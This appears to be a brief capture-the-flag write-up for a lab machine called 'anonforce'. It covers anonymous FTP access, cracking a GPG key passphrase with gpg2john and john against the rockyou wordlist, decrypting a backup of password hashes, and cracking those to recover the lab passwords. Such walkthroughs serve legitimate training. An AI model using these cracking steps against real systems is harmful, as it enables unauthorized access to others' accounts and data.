Just logged in to ftp server as anonymous

Then I saw that folder named motread was odd as that folder normally should not be present in root directory

I found 2 files which I downloaded with : mget

To Recover gpg pass with john:

$ /usr/sbin/gpg2john private.asc > hash.txt


john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

		x -- snip -- x

xbox360          (anonforce)

See: https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html

Now as we got the pass, we can recover gpg passphrase:

$ gpg --import private.asc

$ gpg --decrypt backup.pgp 

Now we got the hashdump from passwd file

Then use john
pass: hikari
